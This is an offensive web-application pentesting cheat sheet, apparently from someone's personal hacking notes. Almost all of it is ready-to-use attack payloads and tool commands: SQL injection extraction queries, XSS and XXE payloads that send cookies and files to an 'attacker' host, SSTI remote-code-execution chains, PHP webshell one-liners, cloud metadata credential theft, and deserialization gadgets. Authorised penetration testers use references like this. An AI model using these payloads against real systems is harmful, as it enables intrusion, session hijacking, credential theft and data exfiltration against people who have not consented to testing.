---
tags:
  - hack-notes
  - web
---

# Web App and Payloads Cheatsheet

## Table of Contents

- [Methodology](#methodology)
- [Burp Suite Workflow](#burp-suite-workflow)
- [Content and Vhost Discovery](#content-and-vhost-discovery)
- [Parameter Discovery](#parameter-discovery)
- [sqlmap](#sqlmap)
- [SQL Injection Payloads](#sql-injection-payloads)
- [XSS Payloads](#xss-payloads)
- [SSTI](#ssti)
- [XXE](#xxe)
- [SSRF](#ssrf)
- [LFI and Path Traversal](#lfi-and-path-traversal)
- [Command Injection](#command-injection)
- [File Upload Bypass](#file-upload-bypass)
- [Open Redirect](#open-redirect)
- [CORS Misconfiguration](#cors-misconfiguration)
- [Insecure Deserialization](#insecure-deserialization)
- [WAF Bypass Primer](#waf-bypass-primer)
- [Common Workflows](#common-workflows)
- [Quick Reference](#quick-reference)

---

## Methodology

bash

```bash
# 1. Recon       - map the app, fingerprint stack, find all entry points
# 2. Map params  - every parameter, header, cookie, JSON field is an input
# 3. Test classes- inject one vuln class at a time, systematically
# 4. Escalate    - turn the primitive into impact (RCE, account takeover, data)

# Always note the tech stack first, it dictates which payloads work
whatweb https://target
nikto -h https://target
# Wappalyzer / built-in browser dev tools for client-side stack
```

---

## Burp Suite Workflow

bash

```bash
# Core loop
# 1. Proxy -> browse the whole app with intercept off to populate the sitemap
# 2. Target -> right-click host -> "Add to scope", filter to in-scope only
# 3. Send interesting requests to Repeater (Ctrl+R) for manual testing
# 4. Send to Intruder (Ctrl+I) for fuzzing params / brute force
# 5. Decoder and Inspector for encoding chains
# 6. Comparer to diff responses (boolean blind, auth states)

# Intruder attack types
# Sniper        - one payload set, one position at a time
# Battering ram - same payload in all positions
# Pitchfork     - parallel payload sets (user+pass pairs)
# Cluster bomb  - all combinations of multiple sets

# Useful extensions (BApp store)
# Logger++, Autorize (authz testing), Param Miner, JSON Web Tokens,
# Turbo Intruder (fast fuzzing), Active Scan++, Collaborator Everywhere

# Match and Replace to force headers app-wide
# Settings -> Match and Replace -> add request header rule
```

---

## Content and Vhost Discovery

### ffuf

bash

```bash
# Directory and file discovery
ffuf -u https://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Add extensions
ffuf -u https://target/FUZZ -w wordlist.txt -e .php,.html,.bak,.txt

# Recursion
ffuf -u https://target/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# Filter by status, size, words, lines
ffuf -u https://target/FUZZ -w wordlist.txt -fc 404 -fs 0 -mc 200,301,302,403

# Vhost fuzzing (Host header)
ffuf -u https://target -H "Host: FUZZ.target.com" -w subdomains.txt -fs 1234

# POST data / parameter fuzz
ffuf -u https://target/login -X POST -d "user=admin&pass=FUZZ" -w pass.txt -fr "Invalid"
```

### feroxbuster

bash

```bash
# Fast recursive content discovery (Rust)
feroxbuster -u https://target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Extensions and filter sizes
feroxbuster -u https://target -x php,html,bak -S 0,1234

# Limit recursion depth and add auth cookie
feroxbuster -u https://target -d 2 -H "Cookie: session=abc"
```

### gobuster

bash

```bash
# Directory mode
gobuster dir -u https://target -w wordlist.txt -x php,html,txt -t 50

# DNS subdomain mode
gobuster dns -d target.com -w subdomains.txt -t 50

# Vhost mode (Host header brute force)
gobuster vhost -u https://target.com -w subdomains.txt --append-domain

# Ignore TLS errors, follow redirects, status blacklist
gobuster dir -u https://target -w wordlist.txt -k -r -b 404,403
```

---

## Parameter Discovery

bash

```bash
# arjun - find hidden GET/POST/JSON parameters
arjun -u https://target/endpoint
arjun -u https://target/endpoint -m POST            # method
arjun -u https://target/endpoint -m JSON
arjun -u https://target/endpoint --headers "Cookie: session=abc"

# paramspider - mine parameters from archived URLs
paramspider -d target.com
paramspider -d target.com --subs

# Param Miner (Burp) - guesses headers and params, finds cache poisoning
```

---

## sqlmap

bash

```bash
# Basic GET injection
sqlmap -u "https://target/item?id=1" --batch

# From a saved Burp request (captures cookies, headers, POST body)
sqlmap -r request.txt --batch

# Target a specific parameter, raise effort
sqlmap -r request.txt -p id --level 5 --risk 3

# Enumerate
sqlmap -r request.txt --dbs                         # databases
sqlmap -r request.txt -D appdb --tables             # tables
sqlmap -r request.txt -D appdb -T users --columns
sqlmap -r request.txt -D appdb -T users --dump

# Current context
sqlmap -r request.txt --current-user --current-db --is-dba

# Through a proxy (Burp) and tamper for WAF
sqlmap -r request.txt --proxy http://127.0.0.1:8080 --tamper=space2comment,between

# Read a file / OS shell where supported
sqlmap -r request.txt --file-read=/etc/passwd
sqlmap -r request.txt --os-shell

# Force backend and technique (B=bool E=error U=union S=stacked T=time)
sqlmap -r request.txt --dbms=mysql --technique=BEU
```

---

## SQL Injection Payloads

### Detection

bash

```sql
'                       -- break the query
"
')
1' AND '1'='1           -- true
1' AND '1'='2           -- false
1 OR 1=1
admin'-- -              -- comment out the rest
```

### Union-Based

bash

```sql
-- find the column count
' ORDER BY 1-- -
' ORDER BY 2-- -        -- increment until error
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -    -- match column count

-- find a string-friendly column then extract
' UNION SELECT 1,version(),3-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

### Error-Based (MySQL)

bash

```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -
' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

### Boolean Blind

bash

```sql
' AND substring((SELECT database()),1,1)='a'-- -
' AND (SELECT count(*) FROM users)>0-- -
' AND ascii(substring((SELECT password FROM users LIMIT 1),1,1))>77-- -
```

### Time Blind

bash

```sql
-- MySQL
' AND IF(1=1,SLEEP(5),0)-- -
' AND SLEEP(5)-- -

-- PostgreSQL
'; SELECT pg_sleep(5)-- -

-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
```

### Per-DBMS Notes

bash

```sql
-- MySQL    comments: -- - , #, /**/   string: concat()  version()
-- MSSQL    comments: --              string: +         @@version  xp_cmdshell
-- Postgres comments: --              string: ||        version()  COPY/large objects
-- Oracle   needs FROM dual           string: ||        v$version  no stacked queries
-- SQLite   sqlite_master table       string: ||        sqlite_version()
```

---

## XSS Payloads

### Reflected and Stored

bash

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">

<!-- exfil cookie -->
<script>new Image().src='https://attacker/c?'+document.cookie</script>
<script>fetch('https://attacker/c?'+document.cookie)</script>
```

### DOM-Based

bash

```html
<!-- sinks to hunt: innerHTML, document.write, eval, location, setTimeout -->
#"><img src=x onerror=alert(1)>
javascript:alert(1)
<!-- source/sink: location.hash -> innerHTML -->
```

### Filter Bypass

bash

```html
<!-- case and tag breaking -->
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- no parentheses -->
<svg onload=alert`1`>
<img src=x onerror="window['ale'+'rt'](1)">

<!-- event handlers when <script> is blocked -->
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>

<!-- encoded -->
<a href="javas&#99;ript:alert(1)">x</a>
```

### Polyglots

bash

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'"><img src=x onerror=alert(1)>
```

---

## SSTI

### Detection

bash

```bash
# Inject math and see if it evaluates
${7*7}      {{7*7}}      <%= 7*7 %>      #{7*7}      ${{7*7}}      {7*7}

# {{7*7}} -> 49  means Jinja2/Twig style
# ${7*7}  -> 49  means Freemarker/Velocity/Spring style
# Confirm engine with a distinguishing payload
{{7*'7'}}   # Jinja2 -> 7777777   Twig -> 49
```

### Jinja2 (Python) RCE

bash

```python
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Twig (PHP) RCE

bash

```php
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ ['id']|filter('system') }}
```

### Freemarker (Java) RCE

bash

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java) RCE

bash

```java
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

### tplmap (automation)

bash

```bash
tplmap -u "https://target/page?name=John"
tplmap -u "https://target/page?name=John" --os-shell
tplmap -r request.txt
```

---

## XXE

### File Read

bash

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>

<!-- PHP wrapper to base64 binary/source files -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/index.php"> ]>
```

### Out-of-Band (OOB) and Blind

bash

```xml
<!-- attacker hosts evil.dtd, response is reflected via the OOB channel -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker/?x=%file;'>">
%eval;
```

### SSRF via XXE

bash

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<foo>&xxe;</foo>
```

---

## SSRF

### Cloud Metadata Endpoints

bash

```bash
# AWS IMDSv1 (no token)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# AWS IMDSv2 (token required first)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# GCP (requires Metadata-Flavor header)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# header: Metadata-Flavor: Google

# Azure (requires Metadata header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# header: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### gopher and Other Schemes

bash

```bash
# gopher to forge raw TCP (e.g. internal Redis, SMTP, unauth HTTP POST)
gopher://127.0.0.1:6379/_SET%20key%20value
gopher://127.0.0.1:25/_HELO%20x

# alternate schemes to reach the file system or internal services
file:///etc/passwd
dict://127.0.0.1:6379/info
```

### Bypass Tricks

bash

```bash
# localhost obfuscation
http://127.0.0.1   http://127.1   http://0   http://0.0.0.0
http://[::1]       http://2130706433        http://0x7f000001
http://localtest.me                          # resolves to 127.0.0.1

# defeat naive allow-list / parser confusion
http://expected.com@169.254.169.254/
http://169.254.169.254#expected.com
http://169.254.169.254%2f@expected.com

# DNS rebinding and decimal/octal IP encodings
http://0251.0376.0251.0376/                   # octal for 169.254.169.254
```

---

## LFI and Path Traversal

bash

```bash
# Basic traversal
../../../../etc/passwd
....//....//....//etc/passwd                  # filter bypass (nested)
..%2f..%2f..%2fetc%2fpasswd                    # url-encoded
%252e%252e%252f                                # double-encoded

# Windows
..\..\..\windows\win.ini
C:\windows\system32\drivers\etc\hosts
```

### PHP Wrappers

bash

```bash
# read source base64-encoded (bypasses execution)
php://filter/convert.base64-encode/resource=index.php

# data wrapper for code execution (allow_url_include=On)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+

# input wrapper - send PHP in the POST body
php://input        # POST: <?php system($_GET['c']); ?>

# expect wrapper (rare)
expect://id
```

### Log Poisoning

bash

```bash
# poison a log with PHP via the User-Agent, then include the log
# 1. send: User-Agent: <?php system($_GET['c']); ?>
# 2. include the log to execute
../../../../var/log/apache2/access.log&c=id
../../../../var/log/nginx/access.log
/var/log/auth.log                              # poison via SSH username
```

### /proc Tricks

bash

```bash
/proc/self/environ                             # poison via User-Agent
/proc/self/cmdline
/proc/self/fd/0                                # file descriptors
```

---

## Command Injection

bash

```bash
# separators to chain commands
; id
| id
|| id          # runs if first fails
&& id          # runs if first succeeds
`id`           # backticks
$(id)          # subshell
%0a id         # newline injection
```

### Bypasses

bash

```bash
# space filtered
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd

# keyword / blacklist bypass
c''at /etc/passwd
c\at /etc/passwd
who"am"i
/???/c?t /etc/passwd                           # globbing

# blind: exfil via DNS or time
ping -c1 `whoami`.attacker.com
sleep 5
nslookup $(whoami).attacker.com
```

---

## File Upload Bypass

bash

```bash
# extension bypass (when only .php blocked)
shell.php5  shell.phtml  shell.pht  shell.phar
shell.PHp                                       # case
shell.php.jpg  shell.jpg.php                    # double extension
shell.php%00.jpg                                # null byte (old PHP)
shell.php/                                       # trailing slash/path
.htaccess                                        # make a new ext execute as php
# AddType application/x-httpd-php .jpg

# magic bytes (spoof file signature)
# prepend GIF89a; to pass image content checks
GIF89a;<?php system($_GET['c']); ?>

# content-type spoof in the multipart request
Content-Type: image/jpeg                         # while body is PHP

# polyglot: valid image + embedded PHP (exiftool comment)
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
```

---

## Open Redirect

bash

```bash
# common vulnerable params
?next=   ?url=   ?redirect=   ?return=   ?dest=   ?continue=

# basic and bypasses
?next=https://attacker.com
?next=//attacker.com                             # scheme-relative
?next=/\attacker.com
?next=https://target.com.attacker.com            # suffix trick
?next=https://target.com@attacker.com            # userinfo trick
?next=https:attacker.com                         # missing slashes
```

---

## CORS Misconfiguration

bash

```bash
# test: reflect an arbitrary Origin and check ACAO
curl -s -I https://target/api/data -H "Origin: https://attacker.com" | grep -i access-control

# vulnerable if response shows:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true

# weak patterns to probe
# null origin
curl -I https://target/api -H "Origin: null"
# prefix/suffix match flaws
curl -I https://target/api -H "Origin: https://target.com.attacker.com"
curl -I https://target/api -H "Origin: https://attacker-target.com"

# exploit PoC (steals data when ACAO reflects + credentials true)
# fetch('https://target/api/me',{credentials:'include'})
#   .then(r=>r.text()).then(d=>fetch('https://attacker/?'+btoa(d)))
```

---

## Insecure Deserialization

### Java (ysoserial)

bash

```bash
# generate a gadget payload (pick chain by libs on the classpath)
java -jar ysoserial.jar CommonsCollections5 'id' > payload.bin
java -jar ysoserial.jar CommonsCollections6 'curl attacker/x' | base64 -w0

# common chains: CommonsCollections1-7, Spring1, Groovy1, URLDNS (detection)
java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net'

# deliver: base64 in a serialized cookie/param, or raw in a body
```

### PHP

bash

```bash
# PHP object injection magic methods to abuse: __wakeup, __destruct, __toString
# craft an object string matching a vulnerable class
# O:4:"User":1:{s:5:"admin";b:1;}

# phpggc - generate PHP gadget chains
phpggc Laravel/RCE1 system id
phpggc -l                                        # list available chains
phpggc Monolog/RCE1 system 'id' -b               # base64 output
```

### .NET (ysoserial.net)

bash

```bash
# generate a payload for a known formatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe"
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c calc"

# ViewState (needs machineKey or oracle)
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd" --generator=...
```

---

## WAF Bypass Primer

bash

```bash
# encoding variations
%2527            # double url-encode the quote
union/**/select  # inline comments to break keywords
UnIoN sElEcT     # mixed case
un/**/ion sel/**/ect

# whitespace alternatives
%09 %0a %0b %0c %0d %a0   tab/newline instead of space
+                          # plus as space in url
/**/                       # comment as space

# concatenation and char functions to avoid literal strings
CONCAT(CHAR(117),CHAR(115)...)    # build keywords from chars
0x73656c656374                    # hex-encoded "select"

# header tricks to confuse origin/WAF
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Forwarded-Host: internal

# tooling
# sqlmap --tamper=between,space2comment,charencode
# Burp Intruder with payload processing rules (encode, hash, prefix)
```

---

## Common Workflows

### Recon to Param Mapping to Injection to RCE

bash

```bash
# 1. Fingerprint and discover content
whatweb https://target
feroxbuster -u https://target -x php,bak,txt -d 2

# 2. Discover hidden parameters on interesting endpoints
arjun -u https://target/profile

# 3. Test each injection class against discovered params
#    SQLi
sqlmap -u "https://target/profile?id=1" --batch --level 3
#    SSTI
curl "https://target/profile?name={{7*7}}"
#    Command injection
curl "https://target/ping?host=127.0.0.1;id"
#    SSRF
curl "https://target/fetch?url=http://169.254.169.254/latest/meta-data/"

# 4. Escalate the strongest primitive to RCE
#    SSTI -> Jinja2 popen, SQLi -> --os-shell, upload -> webshell, deser -> gadget
```

### From Reflected Input to Stored XSS to Session Theft

bash

```bash
# 1. Find a reflection, confirm it renders in HTML context
curl "https://target/search?q=<svg onload=alert(1)>"
# 2. Move to a persisted field (comment, profile) for stored XSS
# 3. Replace alert with a cookie/token exfil to your collaborator
#    <img src=x onerror="fetch('https://attacker/c?'+document.cookie)">
```

### LFI to RCE via Log Poisoning

bash

```bash
# 1. Confirm LFI
curl "https://target/page?file=../../../../etc/passwd"
# 2. Read source via php filter to understand the include
curl "https://target/page?file=php://filter/convert.base64-encode/resource=index.php"
# 3. Poison a log with PHP in User-Agent, include it to execute
curl -A "<?php system(\$_GET['c']); ?>" https://target/
curl "https://target/page?file=../../../../var/log/apache2/access.log&c=id"
```

---

## Quick Reference

bash

```bash
# discovery
ffuf -u https://target/FUZZ -w wl.txt -e .php,.bak -mc 200,301,403
gobuster vhost -u https://target.com -w subs.txt --append-domain
arjun -u https://target/endpoint

# sqli
sqlmap -r request.txt -p id --level 5 --risk 3 --batch --dbs
' UNION SELECT NULL,version()-- -
' AND IF(1=1,SLEEP(5),0)-- -

# xss
<img src=x onerror=alert(document.domain)>
<svg onload=alert`1`>

# ssti detection
{{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}

# xxe file read
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

# ssrf cloud metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# lfi
php://filter/convert.base64-encode/resource=index.php
../../../../var/log/apache2/access.log

# command injection
;id   |id   `id`   $(id)   cat${IFS}/etc/passwd

# upload bypass
shell.phtml   GIF89a;<?php system($_GET['c']);?>

# deserialization
java -jar ysoserial.jar CommonsCollections5 'id'
phpggc Laravel/RCE1 system id
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c calc.exe

# golden rule: identify the stack first, it picks the payload
```

---

## Related

- Checklists: [Web Application](../Checklists/Web%20Application.md), [API Security](../Checklists/API%20Security.md)
- [API JWT and GraphQL](API%20JWT%20and%20GraphQL.md)
- [OSINT and Recon](OSINT%20and%20Recon.md)
- [Reverse Shells and File Transfer](Reverse%20Shells%20and%20File%20Transfer.md)
- [Nuclei Usage](Nuclei%20Usage.md)
- Indago
- BypassBurrito
